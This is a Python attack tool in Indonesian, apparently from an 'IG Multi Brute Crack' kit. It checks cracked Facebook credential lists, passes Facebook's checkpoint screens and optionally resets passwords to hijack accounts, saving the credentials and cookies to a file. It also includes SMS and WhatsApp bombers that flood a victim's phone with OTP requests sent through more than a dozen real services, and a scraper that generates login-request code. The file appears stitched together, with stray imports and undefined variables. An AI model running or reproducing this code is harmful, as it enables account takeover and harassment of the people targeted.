bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m [+] "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s%s\033[0m\033[0mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(U,til,O,U,O))
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0mMasukan file [ CTH%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s\033[0mFile Tidak Ada'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s\033[0mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print(" [+] Isi Yang Benar "%(M,til));jeda(2)
		back()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s\033[0mNama File %s\033[0m Tidak Tersedia"%(M,til,romi))
	jalan("%s%s%s\033[0mMode Pesawatkan Terlebih Dahulu 5 Detik "%(U,til,O))
	pw=input("\n%s%s%s\033[0mUbah Sandi Pada Akun One Tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s\033[0mMasukan Sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s Sandi Minimal 6 Karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print ("%s%s%s\033[0mTotal Akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s\033[0mLogin Akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s\033[0mSelesai Mengecek Akun"%(U,til,O));jeda(0.07)
	input('%s%s%s[%s Enter%s ]'%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://m.facebook.com"
	session.headers.update({"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m Akun Terkunci Sesi New"%(M,til))
		else:
			print("\r%s%s\033[0m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s [+] %s\033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di Ubah \n [+] OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda Login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s [+] \033[0mAkun Terpasang Autentikasi Dua Faktor			"%(M))
			else:
				print("%s%s\033[0mTerjadi Kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s Akun Tidak Checkpoint, Silahkan Anda Login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s [+] %s"%(M,oh))
	else:
		print("%s [+] \033[0mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(M))
#-----------------------[ DEFF SCRAPT METODE ]--------------------#
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 

def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        print('\n [+] Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
    except Exception as e:
        print('\n\n [+] Program Selesai Dalam Waktu 0 Detik\n')

class get_data_web:
    
    def __init__(self):
        self.xyz = requests.Session()
        url = input(' [+] Masukkan URL : ')
        print('\n [1] Source Payload')
        print(' [2] Parsed Payload')
        print(' [3] Source Code Post Requests')
        self.tanya = input(' [+] Pilih : ')
        self.domain = url.split('/')[2]
        self.get_form(url)
       
    def get_form(self,url):
        req = self.xyz.get(url)
        raq = bs(req.content,'html.parser')
        for x in raq.find_all('form'):
            if self.tanya in ['1','01','a']: self.printing1(req,x)
            elif self.tanya in ['2','02','b']: self.printing2(req,x)
            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
            else: exit('\n [+] Isi Yang Benar Asu')

    def get_head1(self,req):
        data = {}
        head = req.headers
        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
        for x,y in zip(head.keys(),head.values()):
            try:
                if x.lower() in usls: continue
                else: data.update({x:y})
            except Exception as e:continue
        return(data)

    def get_data1(self,form):
        data = {}
        for y in form.find_all('input'):
            try:data.update({y['name']:y['value']})
            except Exception as e:continue
        return(data)

    def get_data2(self,form):
        data = []
        for y in form.find_all('input'):
            try:data.append(y)
            except Exception as e:continue
        return(data)

    def get_post1(self,form):
        z = form['action']
        if 'https://'+self.domain in z: return(z)
        elif 'http://'+self.domain in z: return(z)
        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[SOURCE PAYLOAD]\n')
        print('[Host] %s'%(self.domain))
        print('[Head] %s'%(head))
        print('[Data] %s'%(data))
        print('[Coki] %s'%(coki))
        print('[Post] %s'%(post))

    def printing2(self,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[PARSED PAYLOAD]\n')
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print('cookie = {')
        for x,y in zip(coki.keys(),coki.values()):
            print('    %s%s: %s'%(x,' '*(5-len(x)),y))
        print('    }')
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
    def printing3(self,url,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        print('\n\n[SOURCE CODE POST REQUESTS]\n')
        print("url  = '%s'"%(url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    gp = dp.replace(fp,'(.*?)')
                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))
                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print("cookie = requests.Session().cookies.get_dict()")
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

#------------------[ DEFF SPAM SMS ]-------------------#

agent = random.choice(
		[
			"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
			"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
			"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
	]
)

def process_data1():
	sleep(0.10)
	
def spam_sms():
	global nomor 
	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold cyan"))
	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
			sxp_sms()

class sxp_sms:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def sms_otp_1(self, no):
		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
			headers = {
				  "accept": "application/json, text/plain, */*",
				  "authorization": "undefined",
				  "save-data": "on",
				  "user-agent": agent,
				  "content-type": "application/json;charset=UTF-8"
				},
			json = {
				 "phone_number": f"+62{no}"
			  }
		).text

	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "1583590641573155574",
					"request_time": "158359064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
			headers = {
				    "accept": "text/html, application/xhtml+xml, application/json, */*",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				    "content-length": "166",
				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				    "origin": "https://h5.rupiahcepatweb.com",
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-site": "same-site",
				    "user-agent": agent
				  },
			data = {
				 "data": data
			   }
		).text

	def sms_otp_3(self, no):
		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
			headers = {
				    "accept": "*/*",
				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
				    "user-agent": agent,
				    "content-type": "application/json"
				  },
			json = {
				 "grantType": "retry",
				 "method": "sms",
				 "phone": no,
				 "language": "id"
				}
		).text

	def sms_otp_4(self, no):
		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
			headers = {
				    "user-agent": agent,
				    "content-type": "application/json",
				    "referer": "https://www.alodokter.com/login-alodokter",
				    "accept": "application/json",
				    "origin": "https://www.alodokter.com"
				  },
			json = {
				 "user":{
					  "phone": f"0{no}"
					}
				}
		).text

	def sms_otp_5(self, no):
		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
			headers = {
				    "x-requested-with": "XMLHttpRequest",
				    "user-agent": agent,
				    "Referer": "https://www.kelaspintar.id/"
				  },
			data = {
				 "user_mobile": no,
				 "otp_type": "send_otp_reg",
				 "mobile_code": "%2B62"
				}
		).text

	def sms_otp_6(self, no):
		aink_sanz = random.choice(
						[
							"Hallo Mantan",
							"Hallo Bangsad",
							"Hallo Sayang",
							"Hallo Ripper",
							"Hallo Ngab"
						]
					)
		email = random.choice(
					[
						"nsnsmsmksksmsm@gmail.com",
						"lavon.lockman@gmail.com",
						"duane_mclaughlin38@gmail.com",
						"alfreda.lindgren@gmail.com",
						"leonardo_kuhlman@gmail.com",
						"lyric51@gmail.com",
						"devonte_littel@gmail.com",
						"newell.kuhic@gmail.com"
					]
				)
		pw = random.choice(
					[
						"mamsmms123",
						"Wadepak1037",
						"waifugw1011"
					]
				)
		birth_date = random.choice(
						[
							"13/09/1999",
							"04/02/2022",
							"05/02/2022",
							"05/02/2022",
							"06/02/2022",
							"10/02/2022"
						]
	)
		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
			json = {
				"thor_customer":{
						"name": aink_sanz,
						"card_number": None,
						"email_address": email,
						"mobile_country_code": "+62",
						"gender_id": "1",
						"mobile_number": f"0{no}",
						"mro": "",
						"password": pw,
						"birth_date": birth_date
						}
				},
			headers = {
					"Host": "www.matahari.com",
					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
					"origin": "https://www.matahari.com",
					"user-agent": agent,
					"content-type": "application/json",
					"accept": "*/*",
					"x-requested-with": "XMLHttpRequest",
					"referer": "https://www.matahari.com/customer/account/create/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}

		).text

	def sms_otp_7(self, no):
		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
			headers = {
				    "Host": "api.duniagames.co.id",
				    "content-length": "32",
				    "accept": "application/json, text/plain, */*",
				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
				    "accept-language": "id",
				    "user-agent": agent,
				    "ciam-type": "FR",
				    "content-type": "application/json",
				    "origin": "https://duniagames.co.id",
				    "sec-fetch-site": "same-site",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-dest": "empty",
				    "referer": "https://duniagames.co.id/",
				    "accept-encoding": "gzip, deflate, br"
				  },
			json = {
				 "phoneNumber": f"+62{no}"
				}
		).text

	def sms_otp_8(self, no):
		__req__ = self.req.post("https://harvestcakes.com/register",
			headers = {
				    "user-agent": agent,
				    "Referer": "https://harvestcakes.com/register"
				  },
			data = {
				 "phone": f"0{no}",
				 "url": ""
				}
		).text

	def sms_otp_9(self, no):
		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
			headers = {
				    "Host": "identity-gateway.oyorooms.com",
				    "consumer_host": "https://www.oyorooms.com",
				    "accept-language": "id",
				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
				    "user-agent": agent,
				    "Content-Type": "application/json",
				    "accept": "*/*",
				    "origin": "https://www.oyorooms.com",
				    "referer": "https://www.oyorooms.com/login",
				    "Accept-Encoding": "gzip, deflate, br"
				  },
			json = {
				 "phone": f"0{no}",
				 "country_code": "+62",
				 "country_iso_code": "ID",
				 "nod": "4",
				 "send_otp": "true",
				 "devise_role": "Consumer_Guest"
				}
		).text

	def sms_otp_10(self, no):
		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
			json = {
				"mobile_number": f"0{no}",
				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
				},
			headers = {
					"Host": "crp-app.stamps.co.id",
					"content-type": "application/json; charset=utf-8",
					"content-length": "106",
					"accept-encoding": "gzip",
					"User-Agent": agent
			}
		).text

	def sms_otp_11(self, no):
		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
			headers = {
				    "LPR-TIMESTAMP": "1603281035821",
				    "Accept-Language": "id-ID",
				    "LPR-BRAND": "Kredito",
				    "LPR-PLATFORM": "android",
				    "user-agent": agent,
				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Content-Length": "79"
				   },
			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
		).text

	def sms_otp_12(self, no):
		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
			headers = {
					"Host": "www.autofun.co.id",
					"Connection": "keep-alive",
					"Content-length": "84",
					"accept": "*/*",
					"user-agent": agent,
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"content-type": "application/json;charset=UTF-8",
					"Origin": "https://www.autofun.co.id",
					"X-Requested-With": "acr.browser.barebones",
					"Sec-Fetch-Site": "same-origin",
					"Sec-Fetch-Mode": "cors",
					"Sec-Fetch-Dest": "empty",
					"Referer": "https://www.autofun.co.id/mobil/datsun",
					"Accept-Encoding": "gzip, deflate"
				},
			json = {
					"phoneNum": f"62{no}",
					"languageCode": "id-id",
					"countryCode": "id",
					"platform": 2
			}
		).text

	def sms_otp_13(self, no):
		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
			json = {
					"phone":"+62"+no
				},
			headers = {
					"Host": "api.myfave.com",
					"Connection": "keep-alive",
					"x-user-agent": "Fave-PWA/v1.0.0",
					"Origin": "https://m.myfave.com",
					"user-agent": agent,
					"content-type": "application/json",
					"Accept": "*/*",
					"Referer": "https://m.myfave.com/jakarta/auth",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
		).text

	def sms_otp_14(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					)
		angka = random.randint(
					111,
					999
				      )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				  },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"62{no}",
				 "otp_type": "sms"
				}
		).text

	def main(self):
		self.sms_otp_1(nomor)
		self.sms_otp_2(nomor)
		self.sms_otp_3(nomor)
		self.sms_otp_4(nomor)
		self.sms_otp_5(nomor)
		self.sms_otp_6(nomor)
		self.sms_otp_7(nomor)
		self.sms_otp_8(nomor)
		self.sms_otp_9(nomor)
		self.sms_otp_10(nomor)
		self.sms_otp_11(nomor)
		self.sms_otp_12(nomor)
		self.sms_otp_13(nomor)
		self.sms_otp_14(nomor)
		cetak(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold cyan"))

#------------------[ DEFF SPAM WA ]-------------------# 
    
def spam_wa():
	global nomor
	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold cyan"))
	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
			sxp_wa()
			
class sxp_wa:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def wa_otp_1(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					 )
		angka = random.randint(
					111,
					999
				       )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"0{no}",
				 "otp_type": "whatsapp"
				}
		).text

	def wa_otp_2(self, no):
		__req__ = self.req.get(
			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
		).text

	def wa_otp_3(self, no):
		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
			headers = {
				    "Accept": "application/json",
				    "X-APP-VERSION-NAME": "3.4.0",
				    "X-APP-VERSION-CODE": "3399",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Host": "api.bukuwarung.com",
				    "Connection": "Keep-Alive",
				    "Accept-Encoding": "gzip",
				    "User-Agent": agent
				   },
			json = {
				 "action": "LOGIN_OTP",
				 "countryCode": "62",
				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
				 "method": "WA",
				 "phone": no
				}
		).text

	def wa_otp_4(self, no):
		__req__ = self.req.post("https://evermos.com/api/client/request-code",
			headers = {
				    "user-agent": agent
				  },
			data = {
				 "telephone": f"62{no}",
				 "type": 0
				}
		).text

	def wa_otp_5(self, no):
		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
			headers = {
				    "Host": "wapi.ruparupa.com",
				    "Connection": "keep-alive",
				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
				    "Accept": "application/json",
				    "Content-Type": "application/json",
				    "X-Company-Name": "odi",
				    "user-agent": agent,
				    "user-platform": "mobile",
				    "X-Frontend-Type": "mobile",
				    "Origin": "https://m.ruparupa.com",
				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
				    "Accept-Encoding": "gzip, deflate, br",
				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "phone": f"0{no}",
				 "action": "register",
				 "channel": "chat",
				 "email": "",
				 "customer_id": "0",
				 "is_resend": 0
				}
		).text

	def wa_otp_6(self, no):
		headers = {
			    "Connection": "keep-alive",
			    "Accept": "application/json, text/javascript, */*; q=0.01",
			    "Origin": "https://accounts.tokopedia.com",
			    "X-Requested-With": "XMLHttpRequest",
			    "user-agent": agent,
			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			    "Accept-Encoding": "gzip, deflate",
			   }
		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		data = {
			 "otp_type": "116",
			 "msisdn": no,
			 "tk": search,
			 "email": "",
			 "original_param": "",
			 "user_id": "",
			 "signature": "",
			 "number_otp_digit": "6",
			}
		__req__ = self.req.post(
				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
	   ).text

	def main(self):
		self.wa_otp_1(nomor)
		self.wa_otp_2(nomor)
		self.wa_otp_3(nomor)
		self.wa_otp_4(nomor)
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		cetak(panel(f" Sukses Spam WA Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold cyan"))
	
#---------------------MENU IGEH ANDA--------------------------#
def logo():
	cetak(panel(f"""

               ╦╔═╗   ╔═╗╦═╗╔═╗╔═╗╦╔═   script : IG Multi Brute Crack
               ║║ ╦───║  ╠╦╝╠═╣║  ╠╩╗   author : Vindra XD
               ╩╚═╝   ╚═╝╩╚═╩ ╩╚═╝╩ ╩   github : github.com/XyzonXD

